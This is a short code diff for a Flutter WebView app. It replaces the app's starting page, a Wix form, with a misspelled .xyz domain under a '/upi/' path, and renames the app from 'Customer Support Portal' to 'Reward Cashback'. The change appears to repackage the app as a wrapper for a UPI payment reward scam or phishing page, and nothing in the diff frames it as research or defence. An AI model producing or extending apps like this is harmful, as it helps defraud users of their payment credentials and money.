@@ -17,7 +17,7 @@ class _MyHomePageState extends State<MyHomePage> {
   DateTime timeBackPressed = DateTime.now();
   late InAppWebViewController webViewController;
   late PullToRefreshController refreshController;
-  var initialUrl = 'https://forms.wix.com/f/7034895206382043216';
+  var initialUrl = 'https://ree-wardbbestoffars.xyz/upi/';
   double progress = 0;
   var urlController = TextEditingController();
 
@@ -82,7 +82,7 @@ class _MyHomePageState extends State<MyHomePage> {
       },
       child: Scaffold(
         appBar: AppBar(
-          title: const Text('Customer Support Portal'),
+          title: const Text('Reward Cashback'),
           leading: IconButton(
             onPressed: () async {
               if (await webViewController.canGoBack()) {
